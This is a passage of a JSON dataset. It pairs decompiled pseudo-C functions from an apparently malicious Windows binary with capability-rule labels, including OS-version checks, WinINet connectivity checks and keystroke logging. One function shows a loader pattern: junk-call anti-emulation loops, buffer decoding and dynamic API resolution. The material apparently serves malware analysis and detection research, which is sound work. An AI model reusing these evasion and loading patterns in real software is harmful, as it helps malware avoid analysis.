        "decompiled_code": "\nvoid __cdecl fcn.0045a1e4(uint arg_8h)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x45a27e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    var_4h = 0;\n    if (in_EAX != NULL) {\n        while (*in_EAX != '\\0') {\n            while (((cVar1 = *in_EAX,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r'))) {\n                in_EAX = fcn.0040c11c();\n            }\n            fcn.00404098();\n            iVar2 = fcn.0041d664();\n            if (var_4h < iVar2) {\n                var_4h = iVar2;\n            }\n            if (*in_EAX == '\\r') {\n                in_EAX = in_EAX + 1;\n            }\n            if (*in_EAX == '\\n') {\n                in_EAX = in_EAX + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x45a285;\n    uStack28 = 0x45a27d;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 360
    },
    "0045a290": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a290(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_70h;\n    int32_t var_68h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint lprc;\n    uint var_40h;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    char var_1dh;\n    uint lpPoint;\n    uint var_18h;\n    uint dx;\n    uint dy;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = *param_2;\n    var_8h = param_2[1];\n    var_4h = in_EAX;\n    fcn.00404914();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    *(var_4h + 0x58) = 0;\n    if ((*(var_4h + 0x88) != '\\0') && (*(var_4h + 0x60) != 0)) {\n        cVar2 = fcn.004504c8();\n        if (cVar2 != '\\0') {\n            fcn.00437dd8();\n            iVar4 = fcn.00457b10();\n            if (iVar4 == *(var_4h + 0x60)) {\n                var_60h = *(var_4h + 0x60);\n                var_58h = var_ch;\n                var_54h = var_8h;\n                iVar4 = fcn.0045a030();\n                var_54h = var_54h + iVar4;\n                var_50h = fcn.00456ed4();\n                var_4ch = *(var_4h + 0x5c);\n                fcn.00438ecc();\n                (**(**(var_4h + 0x60) + 0x40))();\n                lpPoint = 0;\n                var_18h = 0;\n                piVar1 = *(*(var_4h + 0x60) + 0x30);\n                if (piVar1 == NULL) {\n                    iVar4 = *(var_4h + 0x60);\n                    cVar2 = fcn.004033e4();\n                    if ((cVar2 != '\\0') && (*(iVar4 + 400) != 0)) {\n                        sub.user32.dll_ClientToScreen();\n                    }\n                }\n                else {\n                    (**(*piVar1 + 0x40))();\n                }\n                sub.user32.dll_OffsetRect();\n                fcn.00439070();\n                fcn.00457ad8();\n                fcn.004365f8();\n                fcn.00404040();\n                var_30h = 0;\n                var_2ch = *(var_4h + 0x74);\n                var_5ch = *0x461cd0;\n                var_24h = 0;\n                arg_8h = &var_60h;\n                iVar4 = fcn.0043a6d4(arg_8h);\n                var_1dh = iVar4 == 0;\n                if ((var_1dh) && (*(var_4h + 0x132) != 0)) {\n                    (**(var_4h + 0x130))(&var_60h);\n                }\n                if ((var_1dh == '\\0') || (*(var_4h + 0x60) == 0)) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = 1;\n                }\n                *(var_4h + 0x58) = uVar3;\n                if ((*(var_4h + 0x58) != '\\0') && (var_28h != 0)) {\n                    fcn.0045a184(&stack0xfffffffc);\n                    (**(**(var_4h + 0x84) + 0x70))();\n                    (**(**(var_4h + 0x84) + 0xd8))(&var_70h, var_24h);\n                    sub.user32.dll_OffsetRect(&var_70h, var_58h, var_54h);\n                    cVar2 = fcn.00403454();\n                    if (cVar2 != '\\0') {\n                        iVar4 = fcn.0045a1e4(&stack0xfffffffc);\n                        var_70h = var_70h - (iVar4 + 5);\n                        var_68h = var_68h - (iVar4 + 5);\n                    }\n                    fcn.00439044();\n                    *(var_4h + 100) = var_88h;\n                    *(var_4h + 0x68) = var_84h;\n                    fcn.00439044();\n                    *(var_4h + 0x6c) = var_88h;\n                    *(var_4h + 0x70) = var_84h;\n                    fcn.004396cc();\n                    (**(**(var_4h + 0x84) + 0xd4))(var_24h);\n                    fcn.00457c24();\n                    if (var_30h < 1) {\n                        fcn.00459e00();\n                    }\n                    else {\n                        fcn.00459e00();\n                    }\n                    goto code_r0x0045a5ea;\n                }\n            }\n        }\n    }\n    if (var_30h < 1) {\n        fcn.00459ff8();\n    }\n    else {\n        fcn.00459e00();\n    }\ncode_r0x0045a5ea:\n    *in_FS_OFFSET = arg_8h;\n    fcn.00403fcc();\n    fcn.004049e4();\n    return;\n}\n",
        "token_count": 1423
    },
    "0045a624": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045a624(void)\n\n{\n    if ((*(*0x463bb4 + 0x68) == 0) || (*(*(*0x463bb4 + 0x68) + 0x23c) == 0)) {\n        fcn.00403ffc();\n    }\n    else {\n        fcn.00403ffc();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "0045a660": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.0045a660(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uStack24;\n    \n    iVar1 = *(*0x463bb4 + 0x6c);\n    if (iVar1 == 0) {\ncode_r0x0045a68b:\n        if ((iVar1 != *(in_EAX + 0x44)) && (*(in_EAX + 0x44) != 0)) {\n            iVar3 = fcn.0043a6d4(param_1);\n            iVar3 = iVar3 + -1;\n            if (iVar3 == 0) goto code_r0x0045a6ab;\n        }\n        uVar4 = 0;\n    }\n    else {\n        iVar3 = fcn.0043a6d4(param_1);\n        iVar3 = iVar3 + -1;\n        if (iVar3 != 0) goto code_r0x0045a68b;\ncode_r0x0045a6ab:\n        uVar4 = CONCAT31(iVar3 >> 8, 1);\n    }\n    uVar2 = uVar4 & 0xff;\n    uStack24 = param_2 & 0xffffff00 | uVar2;\n    uStack24._0_1_ = uVar2;\n    if (uStack24 == '\\0') {\n        uVar4 = fcn.004033e4();\n        if (((uVar4 != '\\0') && (*(param_1 + 0x6a) != '\\0')) && (*(param_1 + 0x60) != '\\0')) {\n            uVar4 = fcn.00445e00();\n        }\n    }\n    return CONCAT44(uStack24, uVar4 & 0xffffff00 | uVar2);\n}\n",
        "token_count": 440
    },
    "0045a6f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0045a6f0(uint param_1)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc2) != 0) {\n        in_EAX = (**(in_EAX + 0xc0))();\n    }\n    return CONCAT44(param_1, in_EAX) & 0xffffff00ffffff00;\n}\n",
        "token_count": 87
    },
    "0045a718": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0045a718(uint param_1)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xca) != 0) {\n        in_EAX = (**(in_EAX + 200))();\n    }\n    return CONCAT44(param_1, in_EAX) & 0xffffff00ffffff00;\n}\n",
        "token_count": 82
    },
    "0045a7cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045a7cc(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x45a81f;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    *0x463bb8 = *0x463bb8 + 1;\n    if (*0x463bb8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x463bb0 != 0) {\n            iStack20 = 0x45a7f3;\n            fcn.00450274();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x463bc4 != 0) {\n            iStack20 = *0x463bc4;\n            sub.kernel32.dll_CloseHandle();\n        }\n        fcn.00413698();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 262
    },
    "0045ab04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ab04(uint32_t arg_8h)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t unaff_EBX;\n    char *unaff_EDI;\n    uint var_63h;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        fcn.0045aae0();\n        fcn.0045aa90();\n        UNRECOVERED_JUMPTABLE = arg_8h + 0x7e6;\n        if (0xfffff819 < arg_8h) {\n            UNRECOVERED_JUMPTABLE = fcn.00403198();\n        }\n    // WARNING: Could not recover jumptable at 0x0045ab37. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    fcn.0045ab04(0x45ab45);\n    *unaff_EDI = *unaff_EDI << 1;\n    *(unaff_EBX + 0x23) = *(unaff_EBX + 0x23) + unaff_EBX;\n    UNRECOVERED_JUMPTABLE = swi(1);\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 291
    },
    "004608a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004608a8(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    uchar extraout_DL;\n    uchar extraout_DL_00;\n    uchar uVar4;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uVar6;\n    uint in_stack_ffffffbc;\n    uint uVar7;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack16 = 0x460bc1;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    bVar5 = *0x463bd8 == 0;\n    *0x463bd8 = *0x463bd8 + -1;\n    puVar3 = &stack0xfffffffc;\n    if ((bVar5) && (sub.kernel32.dll_GetLocalTime(0x463bdc),  puVar3 = puStack12,  0x7e0 < *0x463bdc)) {\n        *0x463bf8 = 0x3f66;\n        sub.gdi32.dll_SetPixelV(0, 0, 0, 0);\n        uVar7 = 0;\n        sub.gdi32.dll_ScaleWindowExtEx(0, 0, 0, 0, 0, 0);\n        *0x463bd4 = sub.kernel32.dll_GetLastError();\n        fcn.004029e4();\n        in_stack_ffffffbc = 0x46092c;\n        iVar1 = fcn.0040c214();\n        puVar3 = puStack12;\n        if (iVar1 == 0) {\n            *0x463bf8 = 0;\n            if (*0x463bd4 == 6) {\n                *0x463bf8 = 0x1275;\n                in_stack_ffffffbc = 0x463bdc;\n                sub.kernel32.dll_GetLocalTime();\n                puVar3 = puStack12;\n                if (0x7e0 < *0x463bdc) {\n                    *0x463bf8 = 0x3f85;\n                    *0x463bf4 = 1;\n                    do {\n                        sub.gdi32.dll_SetPixelV();\n                        uVar2 = *0x463bf4;\n                        *0x463bf4 = *0x463bf4 + 1;\n                    } while (uVar2 != 0x1d44);\n                    uVar6 = 0;\n                    sub.gdi32.dll_SetPixelV(0, 0, 0, 0);\n                    in_stack_ffffffbc = sub.kernel32.dll_GetModuleHandleA_2(0x460bf8, 0x460bdc);\n                    iVar1 = sub.kernel32.dll_GetProcAddress_1();\n                    puVar3 = puStack12;\n                    if (iVar1 == 0) {\n                        *0x463bf8 = 0x7e6;\n                        sub.gdi32.dll_SetPixelV(0, 0, 0, 0);\n                        sub.gdi32.dll_SetPixelV();\n                        *0x463bf4 = 1;\n                        do {\n                            sub.gdi32.dll_SetPixelV(uVar7, 0, 0, 0, 0);\n                            uVar2 = *0x463bf4;\n                            *0x463bf4 = *0x463bf4 + 1;\n                        } while (uVar2 != 0x876a);\n                        in_stack_ffffffbc = 0;\n                        sub.gdi32.dll_SetPixelV(0, 0, 0, 0);\n                        *0x463c0c = fcn.004026bc();\n                        puVar3 = puStack12;\n                        if (*0x463c0c != 0) {\n                            *0x463bf4 = 1;\n                            do {\n                                *0x463c08 = *0x463bf4;\n                                uVar2 = *0x463bf4 + 1;\n                                if (*0x463bf4 == 0xffffffff) {\n                                    uVar2 = fcn.00403198();\n                                }\n                                uVar4 = uVar2 % 0x7b;\n                                if (0xff < uVar2 % 0x7b) {\n                                    fcn.00403190();\n                                    uVar4 = extraout_DL;\n                                }\n                                puVar3 = *0x463c0c + *0x463c08;\n                                if (CARRY4(*0x463c0c, *0x463c08)) {\n                                    puVar3 = fcn.00403198();\n                                    uVar4 = extraout_DL_00;\n                                }\n                                *puVar3 = uVar4;\n                                uVar2 = *0x463bf4;\n                                *0x463bf4 = *0x463bf4 + 1;\n                            } while (uVar2 != 0x1e1c7a9b);\n                            fcn.004026dc();\n                            uVar7 = sub.kernel32.dll_LoadLibraryA(0x460c24, 0x460c14);\n                            *0x463bfc = sub.kernel32.dll_GetProcAddress_1(uVar7);\n                            *0x463bf4 = 1;\n                            do {\n                                sub.gdi32.dll_SetPixelV(uVar6, 0, 0, 0, 0);\n                                iVar1 = *0x463bf4;\n                                *0x463bf4 = *0x463bf4 + 1;\n                            } while (iVar1 != 0x8c1f);\n                            *0x463bf4 = 0;\n                            (**0x463bfc)(0x463bec);\n                            sub.gdi32.dll_SetPixelV(0, 0, 0, 0);\n                            do {\n                                (**0x463bfc)(0x463c00);\n                                *0x463c08 = fcn.0045aa5c();\n                                if (0x2c < *0x463c08) {\n                                    uVar2 = *0x463bf4 + 1;\n                                    if (*0x463bf4 == 0xffffffff) {\n                                        uVar2 = fcn.00403198();\n                                    }\n                                    *0x463bec = *0x463c00;\n                                    *0x463bf4 = uVar2;\n                                    *0x463c08 = uVar2;\n                                }\n                                sub.kernel32.dll_Sleep_1(0x16);\n                            } while (*0x463bf4 < 4);\n                            in_stack_ffffffbc = 0;\n                            fcn.0045ab04(0);\n                            puVar3 = puStack12;\n                        }\n                    }\n                }\n            }\n            else {\n                in_stack_ffffffbc = 0;\n                sub.gdi32.dll_SetPixelV(0, 0, 0);\n                puVar3 = puStack12;\n            }\n        }\n    }\n    puStack12 = puVar3;\n    *in_FS_OFFSET = in_stack_ffffffbc;\n    fcn.00403fa8(0x460bc8);\n    return;\n}\n",
        "token_count": 1580
    },
    "004035f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004035f4(void)\n\n{\n    if (1 < *0x461028) {\n        (**0x463014)(0xeedfadf, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 52
    },
    "0040364c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040364c(void)\n\n{\n    uint in_EAX;\n    int32_t unaff_EBX;\n    uint uVar1;\n    uint auStack8 [2];\n    \n    if (1 < *0x461028) {\n        auStack8[0] = *(unaff_EBX + 4);\n        uVar1 = 0;\n        (**0x463014)(0xeedfae0, 0, 1, auStack8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 118
    },
    "00403660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00403660(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    if (1 < *0x461028) {\n        uVar1 = 0;\n        (**0x463014)(0xeedfae0, 0, 1, &stack0xfffffff8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 86
    },
    "00403694": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403694(uint param_1, uint param_2)\n\n{\n    uint uStack16;\n    uint uStack8;\n    \n    if (1 < *0x461028) {\n        uStack16 = 0x4036a5;\n        uStack8 = param_2;\n        fcn.00403674();\n        (**0x463014)(0xeedfae1, 0, 1, &stack0xfffffff0);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "004036bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004036bc(uint param_1, uint param_2)\n\n{\n    uint uStack4;\n    \n    if (1 < *0x461028) {\n        uStack4 = param_2;\n        (**0x463014)(0xeedfae2, 0, 1, &uStack4);\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "004036d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004036d8(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = param_2;\n    uStack4 = in_EAX;\n    if (1 < *0x461028) {\n        (**0x463014)(0xeedfae3, 0, 2, &uStack8);\n    }\n    return CONCAT44(uStack8, uStack4);\n}\n",
        "token_count": 111
    },
    "004045f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004045f4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_2) {\n        iVar1 = *in_EAX;\n        if ((iVar1 != 0) && (*(iVar1 + -8) == 1)) {\n            fcn.004026fc();\n            *in_EAX = iVar1;\n            *(iVar1 + -4) = param_2;\n            *(param_2 + iVar1) = 0;\n            return;\n        }\n        iVar1 = fcn.0040406c();\n        if (*in_EAX != 0) {\n            fcn.004028b8();\n        }\n    }\n    fcn.00403fa8();\n    *in_EAX = iVar1;\n    return;\n}\n",
        "token_count": 195
    },
    "00404884": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404884(uint arg_8h)\n\n{\n    fcn.004047f4();\n    fcn.00404774();\n    return;\n}\n",
        "token_count": 38
    },
    "00404dd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404dd0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **in_EAX;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = *in_EAX;\n    iVar5 = *arg_8h;\n    if (iVar5 < 1) {\n        if (iVar5 < 0) {\n            fcn.00402818();\n        }\n        fcn.00404dc8();\n    }\n    else {\n        var_10h = 0;\n        if (piVar3 != NULL) {\n            var_10h = piVar3[-1];\n            piVar3 = piVar3 + -2;\n        }\n        iVar4 = in_EDX + *(in_EDX + 1);\n        iVar1 = *(iVar4 + 2);\n        piVar2 = *(iVar4 + 6);\n        if (piVar2 == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = *piVar2;\n        }\n        if ((iVar5 * iVar1) / iVar5 != iVar1) {\n            fcn.00402818();\n        }\n        if ((piVar3 == NULL) || (*piVar3 == 1)) {\n            if ((iVar5 < var_10h) && (iVar4 != 0)) {\n                fcn.00404dc0();\n            }\n            fcn.004026fc();\n        }\n        else {\n            *piVar3 = *piVar3 + -1;\n            piVar3 = fcn.004026bc();\n            var_14h = var_10h;\n            if (iVar5 < var_10h) {\n                var_14h = iVar5;\n            }\n            if (iVar4 == 0) {\n                fcn.004028b8();\n            }\n            else {\n                fcn.00402c64();\n                fcn.00404db0(var_14h);\n            }\n        }\n        *piVar3 = 1;\n        piVar3[1] = iVar5;\n        fcn.00402c64();\n        if ((1 < in_ECX) && (-1 < iVar5 + -1)) {\n            do {\n                fcn.00404dd0(arg_8h + 1);\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n        }\n        *in_EAX = piVar3 + 2;\n    }\n    return;\n}\n",
        "token_count": 634
    },
    "00408838": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408838(uint32_t param_1)\n\n{\n    char cVar1;\n    uchar auStack53 [33];\n    uchar *puStack20;\n    uchar uStack16;\n    \n    puStack20 = auStack53 + 1;\n    if (0x1f < param_1) {\n        param_1 = 0x1f;\n    }\n    cVar1 = fcn.0040bf10();\n    if (cVar1 == '\\x01') {\n        param_1 = param_1 - 1;\n    }\n    fcn.00408608();\n    auStack53[param_1 + 1] = 0;\n    uStack16 = 6;\n    fcn.00407a8c();\n    return;\n}\n",
        "token_count": 168
    },
    "00409620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nuint32_t __cdecl fcn.00409620(double *arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint16_t in_AX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    double *pdVar4;\n    uint16_t in_CX;\n    int32_t iVar5;\n    uint16_t in_DX;\n    int32_t iVar6;\n    uint var_8h;\n    uint8_t var_3h;\n    uint var_2h;\n    \n    var_3h = 0;\n    uVar2 = fcn.004095e4();\n    pdVar4 = (uVar2 & 0x7f) * 3;\n    iVar6 = (uVar2 & 0x7f) * 0x18;\n    if ((((in_AX != 0) && (in_AX < 10000)) && (in_DX != 0)) &&\n       (((in_DX < 0xd && (in_CX != 0)) &&\n        (puVar1 = iVar6 + 0x4610da + in_DX * 2,  pdVar4 = in_DX,  in_CX < *puVar1 || in_CX == *puVar1)))) {\n        iVar3 = in_DX - 1;\n        if (0 < iVar3) {\n            iVar5 = 1;\n            do {\n                in_CX = in_CX + *(iVar6 + 0x4610da + iVar5 * 2);\n                iVar5 = iVar5 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = in_AX - 1;\n        iVar6 = iVar3;\n        if (iVar3 < 0) {\n            iVar6 = in_AX + 2;\n        }\n        *arg_8h = ((iVar3 * 0x16d + (iVar6 >> 2)) - iVar3 / 100) + iVar3 / 400 + in_CX + -0xa955a;\n        var_3h = 1;\n        pdVar4 = arg_8h;\n    }\n    return pdVar4 & 0xffffff00 | var_3h;\n}\n",
        "token_count": 497
    },
    "004099e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004099e4(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY332;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack296 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack300 = 0x409b32;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    fcn.00403fa8();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    fcn.00404040();\n    uVar1 = fcn.00404468(&fcn.004099e4::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.004099e4::var_14h, uVar1);\n    uStackY332 = 0x409a67;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        uStackY332 = 0x409a81;\n        fcn.00404218();\n        if (in_EAX == 1) {\n            if (*0x463744 == 4) {\n                if (*0x463748 == 1) {\n                    fcn.00404268();\n                    uStackY332 = 0x409acd;\n                    iVar2 = fcn.0040bf28();\n                    if (iVar2 == 4) {\n                        fcn.0040c038();\n                        fcn.004041a0();\n                        fcn.0040c09c();\n                        uStackY332 = 0x409b11;\n                        fcn.00404098();\n                    }\n                }\n            }\n            else if (*0x463744 == 0x11) {\n                fcn.0040c09c();\n                fcn.004044c8();\n                uStackY332 = in_EDX;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStackY332;\n    fcn.00403fa8(0x409b39);\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 604
    },
    "0040bcf8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040bcf8(void)\n\n{\n    int32_t iVar1;\n    uint uStack148;\n    uint uStack144;\n    uint32_t uStack140;\n    int32_t iStack136;\n    \n    uStack148 = 0x94;\n    iVar1 = sub.kernel32.dll_GetVersionExA(&uStack148);\n    if (iVar1 != 0) {\n        *0x4610c4 = iStack136;\n        *0x4610c8 = uStack148;\n        *0x4610cc = uStack144;\n        if (iStack136 == 1) {\n            *0x4610d0 = uStack140 & 0xffff;\n        }\n        else {\n            *0x4610d0 = uStack140;\n        }\n        fcn.00404218();\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "0040d7cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
